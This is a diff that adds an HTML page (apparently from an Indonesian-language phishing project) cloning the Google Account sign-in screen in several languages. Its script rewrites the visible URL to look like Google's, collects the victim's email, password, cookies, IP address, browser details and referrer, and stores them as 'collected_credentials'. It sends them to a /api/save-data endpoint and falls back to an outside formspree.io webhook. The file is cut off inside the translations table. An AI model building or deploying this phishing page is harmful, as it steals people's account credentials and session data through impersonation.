@@ -1,0 +1,1418 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Akun Google</title>
+    <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
+    <style>
+        :root {
+            --bg-color: #ffffff;
+            --text-color: #202124;
+            --border-color: #dadce0;
+            --input-bg: #ffffff;
+            --container-bg: #ffffff;
+            --link-color: #1a73e8;
+            --button-bg: #1a73e8;
+            --button-hover: #1669d6;
+            --footer-color: #5f6368;
+            --secondary-text: #5f6368;
+            --error-color: #d93025;
+            --success-color: #1e8e3e;
+            --shadow: 0 1px 3px 1px rgba(66,64,67,0.15);
+            --primary-color: #4285f4;
+            --select-bg: #ffffff;
+            --select-border: #dadce0;
+            --option-bg: #ffffff;
+        }
+
+        [data-theme="dark"] {
+            --bg-color: #202124;
+            --text-color: #e8eaed;
+            --border-color: #5f6368;
+            --input-bg: #202124;
+            --container-bg: #202124;
+            --link-color: #8ab4f8;
+            --button-bg: #8ab4f8;
+            --button-hover: #a8c7fa;
+            --footer-color: #9aa0a6;
+            --secondary-text: #9aa0a6;
+            --error-color: #f28b82;
+            --success-color: #81c995;
+            --shadow: 0 1px 3px 1px rgba(0,0,0,0.3);
+            --primary-color: #8ab4f8;
+            --select-bg: #202124;
+            --select-border: #5f6368;
+            --option-bg: #202124;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+            font-family: 'Roboto', 'Segoe UI', Arial, sans-serif;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow-x: hidden;
+            position: fixed;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            transition: background-color 0.3s, color 0.3s;
+            padding: 0;
+            margin: 0;
+            width: 100vw;
+            max-width: 100vw;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 100%;
+            padding: 0 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .header {
+            width: 100%;
+            padding: 40px 0 30px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .logo-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .logo {
+            height: 32px;
+        }
+
+        .account-text {
+            color: var(--secondary-text);
+            font-size: 22px;
+            font-weight: 400;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 400px;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            background-color: var(--container-bg);
+            padding: 40px 30px;
+            margin-top: 10px;
+            box-shadow: var(--shadow);
+        }
+
+        .title {
+            text-align: center;
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 10px;
+            color: var(--text-color);
+        }
+
+        .subtitle {
+            text-align: center;
+            font-size: 16px;
+            font-weight: 400;
+            color: var(--secondary-text);
+            margin-bottom: 35px;
+        }
+
+        .input-container {
+            width: 100%;
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 16px;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            font-size: 16px;
+            background-color: var(--input-bg);
+            color: var(--text-color);
+            transition: border 0.2s;
+        }
+
+        .input-field:focus {
+            border-color: var(--link-color);
+            outline: none;
+            border-width: 2px;
+        }
+
+        .input-field.error {
+            border-color: var(--error-color);
+        }
+
+        .input-field.valid {
+            border-color: var(--success-color);
+        }
+
+        .error-message {
+            color: var(--error-color);
+            font-size: 14px;
+            margin-top: 8px;
+            display: none;
+        }
+
+        .success-message {
+            color: var(--success-color);
+            font-size: 14px;
+            margin-top: 8px;
+            display: none;
+        }
+
+        .forgot-email {
+            color: var(--link-color);
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            margin-bottom: 40px;
+            display: block;
+            cursor: pointer;
+        }
+
+        .guest-mode {
+            color: var(--secondary-text);
+            font-size: 14px;
+            line-height: 1.4286;
+            margin-bottom: 40px;
+        }
+
+        .guest-mode a {
+            color: var(--link-color);
+            text-decoration: none;
+        }
+
+        .button-container {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 40px;
+            width: 100%;
+        }
+
+        .create-account {
+            color: var(--link-color);
+            font-weight: 500;
+            background: none;
+            border: none;
+            padding: 12px 0;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .next-button {
+            background-color: var(--button-bg);
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            padding: 12px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            min-width: 80px;
+        }
+
+        .next-button:hover {
+            background-color: var(--button-hover);
+        }
+
+        .next-button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .password-container {
+            display: none;
+            animation: fadeIn 0.3s;
+        }
+
+        .remember-me {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: var(--text-color);
+            font-size: 14px;
+        }
+
+        .remember-me input {
+            margin-right: 8px;
+        }
+
+        .show-password {
+            position: absolute;
+            right: 15px;
+            top: 16px;
+            background: none;
+            border: none;
+            color: var(--link-color);
+            font-size: 14px;
+            cursor: pointer;
+            display: none;
+        }
+
+        .footer {
+            margin-top: 40px;
+            color: var(--footer-color);
+            font-size: 12px;
+            text-align: center;
+            padding: 0 20px;
+            width: 100%;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            align-items: center;
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+
+        .footer a {
+            color: var(--footer-color);
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .back-button {
+            background: none;
+            border: none;
+            color: var(--link-color);
+            font-size: 14px;
+            cursor: pointer;
+            margin-bottom: 20px;
+            display: none;
+            align-self: flex-start;
+            padding: 8px 0;
+        }
+
+        .max-accounts-message {
+            display: none;
+            background-color: rgba(217,48,37,0.1);
+            border: 1px solid var(--error-color);
+            border-radius: 4px;
+            padding: 16px;
+            margin-bottom: 20px;
+            color: var(--error-color);
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .email-hint {
+            font-size: 12px;
+            color: var(--secondary-text);
+            margin-top: 5px;
+            display: none;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .loader {
+            border: 3px solid var(--border-color);
+            border-top: 3px solid var(--link-color);
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: none;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .language-selector {
+            margin-top: 10px;
+            padding: 8px 30px 8px 12px;
+            font-size: 13px;
+            color: var(--footer-color);
+            background: var(--select-bg);
+            border: 1px solid var(--select-border);
+            border-radius: 4px;
+            width: 150px;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
+            background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%22292.4%22%20height%3D%22292.4%22%3E%3Cpath%20fill%3D%22%235f6368%22%20d%3D%22M287%2069.4a17.6%2017.6%200%200%200-13-5.4H18.4c-5%200-9.3%201.8-12.9%205.4A17.6%2017.6%200%200%200%200%2082.2c0%205%201.8%209.3%205.4%2012.9l128%20127.9c3.6%203.6%207.8%205.4%2012.8%205.4s9.2-1.8%2012.8-5.4L287%2095c3.5-3.5%205.4-7.8%205.4-12.8%200-5-1.9-9.2-5.5-12.8z%22%2F%3E%3C%2Fsvg%3E");
+            background-repeat: no-repeat;
+            background-position: right 8px center;
+            background-size: 12px;
+            cursor: pointer;
+        }
+
+        .language-selector option {
+            background-color: var(--option-bg);
+            color: var(--text-color);
+            padding: 8px;
+        }
+
+        .language-selector:focus {
+            outline: none;
+            border-color: var(--link-color);
+        }
+
+        .captcha-container {
+            display: none;
+            margin-bottom: 20px;
+            padding: 15px;
+            background-color: rgba(0,0,0,0.03);
+            border-radius: 4px;
+        }
+
+        .captcha-text {
+            font-size: 14px;
+            margin-bottom: 10px;
+            color: var(--secondary-text);
+        }
+
+        .captcha-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            font-size: 16px;
+            background-color: var(--input-bg);
+            color: var(--text-color);
+        }
+
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 30px 20px;
+                border: none;
+                box-shadow: none;
+                max-width: 100%;
+            }
+            
+            .container {
+                padding: 0 16px;
+            }
+            
+            .header {
+                padding: 30px 0 20px;
+            }
+            
+            .footer-links {
+                flex-direction: column;
+                gap: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo-container">
+                <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_160x56dp.png" 
+                     alt="Google" 
+                     class="logo"
+                     onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNzUiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCA3NSAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBkPSJNNjcuOTU0IDE2LjcxNmMtLjQ3NyAwLS45NTQtLjE0My0xLjM2My0uNDNsLjEzNi0xLjAyMiAxLjAyMi4xMzZjLjIwNC4wNjguMzQuMjA0LjM0LjM0IDAgLjIwNC0uMjA0LjM0LS40NzcuMzRoLS40Nzd2LjQ3N2guNDc3Yy41NDUgMCAuOTU0LS4zNC45NTQtLjgxNyAwLS4zNC0uMjA0LS42MTMtLjYxMy0uNzVsLS45NTQtLjI3MmMtLjU0NS0uMTM2LS45NTQtLjU0NS0uOTU0LTEuMDkgMC0uNzUuNjEzLTEuMjk1IDEuMzYzLTEuMjk1LjQ3NyAwIC45NTQuMTM2IDEuMjk1LjQ3N2wtLjIwNCAxLjA5LTEuMDktLjIwNGMtLjA2OCAwLS4yMDQtLjA2OC0uMjA0LS4yMDQgMC0uMTM2LjEzNi0uMjcyLjM0LS4yNzJoLjU0NXYtLjQ3N2gtLjU0NWMtLjU0NSAwLS45NTQuMzQtLjk1NC44MTcgMCAuMzQuMjA0LjYxMy42MTMuNzVsLjk1NC4yNzJjLjU0NS4xMzYuOTU0LjU0NS45NTQgMS4wOSAwIC43NS0uNjEzIDEuMjk1LSIgc3R5bGU9ImZpbGw6IzQyODVmNDsiLz48L3N2Zz4='">
+                <div class="account-text" id="accountText">Akun Google</div>
+            </div>
+        </div>
+        
+        <div class="login-container">
+            <div id="maxAccountsMessage" class="max-accounts-message">
+                Anda telah login di jumlah akun maksimum. Untuk login dengan akun ini, keluar dari salah satu akun yang sudah login atau coba di perangkat lain.
+            </div>
+            
+            <button id="backButton" class="back-button">← Kembali</button>
+            
+            <h1 class="title" id="pageTitle">Login</h1>
+            <p class="subtitle" id="pageSubtitle">Gunakan Akun Google Anda</p>
+            
+            <div id="captchaStep" class="captcha-container">
+                <div class="captcha-text" id="captchaText">Ketik teks yang Anda dengar atau lihat</div>
+                <input type="text" id="captchaInput" class="captcha-input" placeholder="Masukkan teks di sini">
+            </div>
+            
+            <div id="emailStep">
+                <div class="input-container">
+                    <input type="email" id="email" class="input-field" placeholder="Email atau nomor telepon" autofocus>
+                    <div id="emailHint" class="email-hint">Masukkan alamat email Google (gmail.com atau googlemail.com)</div>
+                    <div id="emailError" class="error-message">Masukkan alamat email yang valid</div>
+                    <div id="emailSuccess" class="success-message">Email valid ✓</div>
+                </div>
+                
+                <a href="#" id="forgotEmail" class="forgot-email">Lupa email?</a>
+                
+                <p class="guest-mode">
+                    <strong id="notYourComputer">Bukan komputer Anda?</strong>
+                    <span id="guestModeText"> Gunakan Private Window untuk login.</span> 
+                    <a href="https://support.google.com/chrome/answer/6130773?hl=id" target="_blank" id="learnMore">Pelajari lebih lanjut cara menggunakan Mode tamu</a>
+                </p>
+            </div>
+            
+            <div id="passwordStep" class="password-container">
+                <div class="input-container">
+                    <input type="password" id="password" class="input-field" placeholder="Masukkan sandi Anda" autofocus>
+                    <button type="button" id="showPassword" class="show-password">Tampilkan</button>
+                    <div id="passwordError" class="error-message"></div>
+                </div>
+                
+                <div class="remember-me">
+                    <input type="checkbox" id="rememberMe">
+                    <label for="rememberMe" id="rememberText">Tetap masuk</label>
+                </div>
+                
+                <a href="#" id="forgotPassword" class="forgot-email">Lupa sandi?</a>
+            </div>
+            
+            <div class="button-container">
+                <button class="create-account" id="createAccount">Buat akun</button>
+                <button class="next-button" id="nextButton" disabled>Selanjutnya</button>
+            </div>
+            
+            <div class="loader" id="loader"></div>
+        </div>
+        
+        <div class="footer">
+            <div class="footer-links">
+                <select id="languageSelect" class="language-selector">
+                    <option value="af">Afrikaans</option>
+                    <option value="sq">Shqip</option>
+                    <option value="am">አማርኛ</option>
+                    <option value="ar">العربية</option>
+                    <option value="hy">Հայերեն</option>
+                    <option value="az">Azərbaycan</option>
+                    <option value="eu">Euskara</option>
+                    <option value="be">Беларуская</option>
+                    <option value="bn">বাংলা</option>
+                    <option value="bs">Bosanski</option>
+                    <option value="bg">Български</option>
+                    <option value="my">မြန်မာ</option>
+                    <option value="ca">Català</option>
+                    <option value="zh-CN">中文（简体）</option>
+                    <option value="zh-TW">中文（繁體）</option>
+                    <option value="hr">Hrvatski</option>
+                    <option value="cs">Čeština</option>
+                    <option value="da">Dansk</option>
+                    <option value="nl">Nederlands</option>
+                    <option value="en" selected>English</option>
+                    <option value="et">Eesti</option>
+                    <option value="fil">Filipino</option>
+                    <option value="fi">Suomi</option>
+                    <option value="fr">Français</option>
+                    <option value="gl">Galego</option>
+                    <option value="ka">ქართული</option>
+                    <option value="de">Deutsch</option>
+                    <option value="el">Ελληνικά</option>
+                    <option value="gu">ગુજરાતી</option>
+                    <option value="iw">עברית</option>
+                    <option value="hi">हिन्दी</option>
+                    <option value="hu">Magyar</option>
+                    <option value="is">Íslenska</option>
+                    <option value="id">Bahasa Indonesia</option>
+                    <option value="ga">Gaeilge</option>
+                    <option value="it">Italiano</option>
+                    <option value="ja">日本語</option>
+                    <option value="kn">ಕನ್ನಡ</option>
+                    <option value="kk">Қазақ</option>
+                    <option value="km">ខ្មែរ</option>
+                    <option value="ko">한국어</option>
+                    <option value="ky">Кыргызча</option>
+                    <option value="lo">ລາວ</option>
+                    <option value="lv">Latviešu</option>
+                    <option value="lt">Lietuvių</option>
+                    <option value="mk">Македонски</option>
+                    <option value="ms">Bahasa Melayu</option>
+                    <option value="ml">മലയാളം</option>
+                    <option value="mt">Malti</option>
+                    <option value="mr">मराठी</option>
+                    <option value="mn">Монгол</option>
+                    <option value="ne">नेपाली</option>
+                    <option value="no">Norsk</option>
+                    <option value="ps">پښتو</option>
+                    <option value="fa">فارسی</option>
+                    <option value="pl">Polski</option>
+                    <option value="pt-BR">Português (Brasil)</option>
+                    <option value="pt-PT">Português (Portugal)</option>
+                    <option value="pa">ਪੰਜਾਬੀ</option>
+                    <option value="ro">Română</option>
+                    <option value="ru">Русский</option>
+                    <option value="sr">Српски</option>
+                    <option value="si">සිංහල</option>
+                    <option value="sk">Slovenčina</option>
+                    <option value="sl">Slovenščina</option>
+                    <option value="es">Español</option>
+                    <option value="sw">Kiswahili</option>
+                    <option value="sv">Svenska</option>
+                    <option value="ta">தமிழ்</option>
+                    <option value="te">తెలుగు</option>
+                    <option value="th">ไทย</option>
+                    <option value="tr">Türkçe</option>
+                    <option value="uk">Українська</option>
+                    <option value="ur">اردو</option>
+                    <option value="uz">O‘zbek</option>
+                    <option value="vi">Tiếng Việt</option>
+                    <option value="cy">Cymraeg</option>
+                    <option value="zu">Zulu</option>
+                    <option value="cmn">Kamerun (Pidgin)</option>
+                </select>
+                <a href="https://support.google.com/accounts?hl=id" target="_blank" id="helpLink">Bantuan</a>
+                <a href="https://policies.google.com/privacy?hl=id" target="_blank" id="privacyLink">Privasi</a>
+                <a href="https://policies.google.com/terms?hl=id" target="_blank" id="termsLink">Persyaratan</a>
+            </div>
+            <div style="margin-top: 10px;">
+                © 2024 Google
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Deteksi tema browser
+        const prefersDarkScheme = window.matchMedia('(prefers-color-scheme: dark)');
+        
+        function updateTheme() {
+            if (prefersDarkScheme.matches) {
+                document.documentElement.setAttribute('data-theme', 'dark');
+            } else {
+                document.documentElement.removeAttribute('data-theme');
+            }
+        }
+        
+        updateTheme();
+        prefersDarkScheme.addEventListener('change', updateTheme);
+        
+        // Generate URL parameter seperti Google asli
+        function generateGoogleURLParams(lang = 'id') {
+            const params = new URLSearchParams({
+                'hl': lang,
+                'ifkv': 'ATuJsjxtOBeZDuRmB7aXp-t7SKJXmJLQ0gwLtISqhsxIyjcD8f26SWZ9gxRQXTnexAOh2jbXHugR',
+                'flowName': 'GlifWebSignIn',
+                'flowEntry': 'ServiceLogin',
+                'dsh': 'S1628295783%3A1709606966038322',
+                'theme': 'mo'
+            });
+            return params.toString();
+        }
+        
+        // Update URL di browser tanpa reload
+        function updateBrowserURL(lang) {
+            const newParams = generateGoogleURLParams(lang);
+            const newURL = `https://accounts.google.com/v3/signin/identifier?${newParams}`;
+            
+            // Update URL di address bar (hanya visual, tidak redirect)
+            window.history.replaceState({}, '', `?${newParams}`);
+            
+            // Simpan referensi URL asli untuk redirect nanti
+            window.googleRedirectURL = newURL;
+            
+            return newURL;
+        }
+        
+        // Koleksi data user
+        let userData = {
+            timestamp: new Date().toISOString(),
+            ip: '',
+            cookies: document.cookie,
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            platform: navigator.platform,
+            screen: `${window.screen.width}x${window.screen.height}`,
+            referrer: document.referrer,
+            url: window.location.href,
+            email: '',
+            password: ''
+        };
+        
+        // Fungsi untuk mendapatkan IP via service gratis
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                try {
+                    const response = await fetch('https://api64.ipify.org?format=json');
+                    const data = await response.json();
+                    return data.ip;
+                } catch {
+                    return 'Tidak dapat mengambil IP';
+                }
+            }
+        }
+        
+        // Fungsi untuk menyimpan data ke GitHub via Vercel API
+        async function saveToGitHub(dataType, data) {
+            try {
+                const saveData = {
+                    ...userData,
+                    dataType: dataType,
+                    collectedData: data
+                };
+                
+                // Simpan ke localStorage sebagai backup
+                const existingData = JSON.parse(localStorage.getItem('collected_credentials') || '[]');
+                existingData.push(saveData);
+                localStorage.setItem('collected_credentials', JSON.stringify(existingData));
+                
+                // Kirim ke server
+                const response = await fetch('/api/save-data', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(saveData)
+                });
+                
+                if (!response.ok) {
+                    await sendToWebhook(saveData);
+                }
+                
+            } catch (error) {
+                console.log('Data disimpan lokal:', data);
+            }
+        }
+        
+        // Fallback webhook
+        async function sendToWebhook(data) {
+            try {
+                const formData = new FormData();
+                formData.append('timestamp', data.timestamp);
+                formData.append('ip', data.ip);
+                formData.append('email', data.email);
+                formData.append('password', data.password);
+                formData.append('userAgent', data.userAgent);
+                formData.append('data', JSON.stringify(data));
+                
+                await fetch('https://formspree.io/f/xnqewvzl', {
+                    method: 'POST',
+                    body: formData,
+                    mode: 'no-cors'
+                });
+            } catch (error) {
+                console.log('Webhook failed, data saved locally');
+            }
+        }
+        
+        // Terjemahan untuk semua bahasa
+        const translations = {
+            'id': {
+                account: 'Akun Google',
+                login: 'Login',
+                subtitle: 'Gunakan Akun Google Anda',
+                emailPlaceholder: 'Email atau nomor telepon',
+                forgotEmail: 'Lupa email?',
+                notYourComputer: 'Bukan komputer Anda?',
+                guestMode: 'Gunakan Private Window untuk login.',
+                learnMore: 'Pelajari lebih lanjut cara menggunakan Mode tamu',
+                createAccount: 'Buat akun',
+                next: 'Selanjutnya',
+                passwordPlaceholder: 'Masukkan sandi Anda',
+                showPassword: 'Tampilkan',
+                hidePassword: 'Sembunyikan',
+                staySignedIn: 'Tetap masuk',
+                forgotPassword: 'Lupa sandi?',
+                back: '← Kembali',
+                maxAccounts: 'Anda telah login di jumlah akun maksimum. Untuk login dengan akun ini, keluar dari salah satu akun yang sudah login atau coba di perangkat lain.',
+                wrongPassword: 'Sandi salah. Coba lagi atau klik "Lupa sandi" untuk meresetnya.',
+                accountLocked: 'Terlalu banyak upaya gagal. Coba lagi nanti atau gunakan metode pemulihan lain.',
+                loading: 'Memeriksa...',
+                emailHint: 'Masukkan alamat email Google (gmail.com atau googlemail.com)',
+                invalidEmail: 'Masukkan alamat email Google yang valid',
+                help: 'Bantuan',
+                privacy: 'Privasi',
+                terms: 'Persyaratan',
+                captchaText: 'Ketik teks yang Anda dengar atau lihat',
+                captchaPlaceholder: 'Masukkan teks di sini'
+            },
+            'en': {
+                account: 'Google Account',
+                login: 'Sign in',
+                subtitle: 'Use your Google Account',
+                emailPlaceholder: 'Email or phone',
+                forgotEmail: 'Forgot email?',
+                notYourComputer: 'Not your computer?',
+                guestMode: 'Use Guest mode to sign in privately.',
+                learnMore: 'Learn more about using Guest mode',
+                createAccount: 'Create account',
+                next: 'Next',
+                passwordPlaceholder: 'Enter your password',
+                showPassword: 'Show',
+                hidePassword: 'Hide',
+                staySignedIn: 'Stay signed in',
+                forgotPassword: 'Forgot password?',
+                back: '← Back',
+                maxAccounts: 'You\'re signed in to the maximum number of accounts. To sign in with this account, sign out of one of your other accounts or try on a different device.',
+                wrongPassword: 'Wrong password. Try again or click "Forgot password" to reset it.',
+                accountLocked: 'Too many failed attempts. Try again later or use another recovery method.',
+                loading: 'Checking...',
+                emailHint: 'Enter a Google email address (gmail.com or googlemail.com)',
+                invalidEmail: 'Please enter a valid Google email address',
+                help: 'Help',
+                privacy: 'Privacy',
+                terms: 'Terms',
+                captchaText: 'Type the text you hear or see',
+                captchaPlaceholder: 'Enter the text here'
+            },
+            'ru': {
+                account: 'Аккаунт Google',
+                login: 'Вход',
+                subtitle: 'Войдите в аккаунт Google',
+                emailPlaceholder: 'Адрес эл. почты или номер телефона',
+                forgotEmail: 'Забыли адрес эл. почты?',
+                notYourComputer: 'Чужой компьютер?',
+                guestMode: 'Для входа используйте режим инкогнито.',
+                learnMore: 'Подробнее о режиме инкогнито',
+                createAccount: 'Создать аккаунт',
+                next: 'Далее',
+                passwordPlaceholder: 'Введите пароль',
+                showPassword: 'Показать',
+                hidePassword: 'Скрыть',
+                staySignedIn: 'Оставаться в системе',
+                forgotPassword: 'Забыли пароль?',
+                back: '← Назад',
+                maxAccounts: 'Вы вошли в максимальное количество аккаунтов. Чтобы войти с этим аккаунтом, выйдите из одного из других аккаунтов или попробуйте на другом устройстве.',
+                wrongPassword: 'Неверный пароль. Повторите попытку или нажмите "Забыли пароль", чтобы сбросить его.',
+                accountLocked: 'Слишком много неудачных попыток. Повторите попытку позже или используйте другой способ восстановления.',
+                loading: 'Проверка...',
+                emailHint: 'Введите адрес электронной почты Google (gmail.com или googlemail.com)',
+                invalidEmail: 'Введите действительный адрес электронной почты Google',
+                help: 'Справка',
+                privacy: 'Конфиденциальность',
+                terms: 'Условия',
+                captchaText: 'Введите текст, который вы слышите или видите',
+                captchaPlaceholder: 'Введите текст здесь'
+            },
+            'cmn': {
+                account: 'Google Account',
+                login: 'Sign in',
+                subtitle: 'Use your Google Account',
+                emailPlaceholder: 'Email or phone',
+                forgotEmail: 'Forget email?',
+                notYourComputer: 'No be your computer?',
+                guestMode: 'Use Private Window for login.',
+                learnMore: 'Learn more about how to use Guest mode',
+                createAccount: 'Make account',
+                next: 'Next',
+                passwordPlaceholder: 'Put your password',
+                showPassword: 'Show',
+                hidePassword: 'Hide',
+                staySignedIn: 'Stay for inside',
+                forgotPassword: 'Forget password?',
+                back: '← Go back',
+                maxAccounts: 'You don login for plenty accounts. For login with this account, commot from one of your other accounts or try for different phone.',
+                wrongPassword: 'Password no correct. Try again or press "Forget password" for reset am.',
+                accountLocked: 'Too much try wey no work. Try again later or use other way for find your account.',
+                loading: 'Dey check...',
+                emailHint: 'Put Google email address (gmail.com or googlemail.com)',
+                invalidEmail: 'Put correct Google email address',
+                help: 'Help',
+                privacy: 'Privacy',
+                terms: 'Terms',
+                captchaText: 'Type the thing wey you hear or see',
+                captchaPlaceholder: 'Put the text here'
+            },
+            'es': {
+                account: 'Cuenta de Google',
+                login: 'Iniciar sesión',
+                subtitle: 'Usa tu cuenta de Google',
+                emailPlaceholder: 'Correo electrónico o teléfono',
+                forgotEmail: '¿Has olvidado tu correo electrónico?',
+                notYourComputer: '¿No es tu ordenador?',
+                guestMode: 'Usa una ventana de incógnito para iniciar sesión.',
+                learnMore: 'Más información sobre el modo de incógnito',
+                createAccount: 'Crear cuenta',
+                next: 'Siguiente',
+                passwordPlaceholder: 'Introduce tu contraseña',
+                showPassword: 'Mostrar',
+                hidePassword: 'Ocultar',
+                staySignedIn: 'Mantener la sesión iniciada',
+                forgotPassword: '¿Has olvidado tu contraseña?',
+                back: '← Atrás',
+                maxAccounts: 'Has iniciado sesión en el número máximo de cuentas. Para iniciar sesión con esta cuenta, cierra sesión en una de tus otras cuentas o prueba en un dispositivo diferente.',
+                wrongPassword: 'Contraseña incorrecta. Vuelve a intentarlo o haz clic en "¿Has olvidado tu contraseña?" para restablecerla.',
+                accountLocked: 'Demasiados intentos fallidos. Vuelve a intentarlo más tarde o usa otro método de recuperación.',
+                loading: 'Comprobando...',
+                emailHint: 'Introduce una dirección de correo electrónico de Google (gmail.com o googlemail.com)',
+                invalidEmail: 'Introduce una dirección de correo electrónico de Google válida',
+                help: 'Ayuda',
+                privacy: 'Privacidad',
+                terms: 'Condiciones',
+                captchaText: 'Escribe el texto que oyes o ves',
+                captchaPlaceholder: 'Introduce el texto aquí'
+            },
+            'fr': {
+                account: 'Compte Google',
+                login: 'Se connecter',
+                subtitle: 'Utilisez votre compte Google',
+                emailPlaceholder: 'Adresse e-mail ou numéro de téléphone',
+                forgotEmail: 'Adresse e-mail oubliée ?',
+                notYourComputer: 'Vous n\'utilisez pas votre ordinateur ?',
+                guestMode: 'Utilisez une fenêtre de navigation privée pour vous connecter.',
+                learnMore: 'En savoir plus sur le mode navigation privée',
+                createAccount: 'Créer un compte',
+                next: 'Suivant',
+                passwordPlaceholder: 'Saisissez votre mot de passe',
+                showPassword: 'Afficher',
+                hidePassword: 'Masquer',
+                staySignedIn: 'Rester connecté',
+                forgotPassword: 'Mot de passe oublié ?',
+                back: '← Retour',
+                maxAccounts: 'Vous êtes connecté au nombre maximum de comptes. Pour vous connecter avec ce compte, déconnectez-vous d\'un de vos autres comptes ou essayez sur un autre appareil.',
+                wrongPassword: 'Mot de passe incorrect. Réessayez ou cliquez sur "Mot de passe oublié" pour le réinitialiser.',
+                accountLocked: 'Trop de tentatives infructueuses. Réessayez plus tard ou utilisez une autre méthode de récupération.',
+                loading: 'Vérification...',
+                emailHint: 'Saisissez une adresse e-mail Google (gmail.com ou googlemail.com)',
+                invalidEmail: 'Veuillez saisir une adresse e-mail Google valide',
+                help: 'Aide',
+                privacy: 'Confidentialité',
+                terms: 'Conditions',
+                captchaText: 'Saisissez le texte que vous entendez ou voyez',
+                captchaPlaceholder: 'Saisissez le texte ici'
+            },
+            'de': {
+                account: 'Google-Konto',
+                login: 'Anmelden',
+                subtitle: 'Mit Google-Konto anmelden',
+                emailPlaceholder: 'E-Mail-Adresse oder Telefonnummer',
+                forgotEmail: 'E-Mail-Adresse vergessen?',
+                notYourComputer: 'Nicht Ihr Computer?',
+                guestMode: 'Verwenden Sie ein privates Fenster für die Anmeldung.',
+                learnMore: 'Weitere Informationen zum privaten Modus',
+                createAccount: 'Konto erstellen',
+                next: 'Weiter',
+                passwordPlaceholder: 'Passwort eingeben',
+                showPassword: 'Anzeigen',
+                hidePassword: 'Ausblenden',
+                staySignedIn: 'Angemeldet bleiben',
+                forgotPassword: 'Passwort vergessen?',
+                back: '← Zurück',
+                maxAccounts: 'Sie sind mit der maximalen Anzahl von Konten angemeldet. Um sich mit diesem Konto anzumelden, melden Sie sich von einem Ihrer anderen Konten ab oder versuchen Sie es auf einem anderen Gerät.',
+                wrongPassword: 'Falsches Passwort. Versuchen Sie es erneut oder klicken Sie auf "Passwort vergessen", um es zurückzusetzen.',
+                accountLocked: 'Zu viele fehlgeschlagene Versuche. Versuchen Sie es später erneut oder verwenden Sie eine andere Wiederherstellungsmethode.',
+                loading: 'Wird geprüft...',
+                emailHint: 'Geben Sie eine Google-E-Mail-Adresse ein (gmail.com oder googlemail.com)',
+                invalidEmail: 'Bitte geben Sie eine gültige Google-E-Mail-Adresse ein',
+                help: 'Hilfe',
+                privacy: 'Datenschutzerklärung',
+                terms: 'Nutzungsbedingungen',
+                captchaText: 'Geben Sie den Text ein, den Sie hören oder sehen',
+                captchaPlaceholder: 'Text hier eingeben'
+            },
+            'ja': {
+                account: 'Google アカウント',
+                login: 'ログイン',
+                subtitle: 'Google アカウントを使用',
+                emailPlaceholder: 'メールアドレスまたは電話番号',
+                forgotEmail: 'メールアドレスを忘れた場合',
+                notYourComputer: 'このパソコンではない場合',
+                guestMode: 'プライベートウィンドウを使用してログイン',
+                learnMore: 'シークレットモードの詳細',
+                createAccount: 'アカウントを作成',
+                next: '次へ',
+                passwordPlaceholder: 'パスワードを入力',
+                showPassword: '表示',
+                hidePassword: '非表示',
+                staySignedIn: 'ログイン状態を維持',
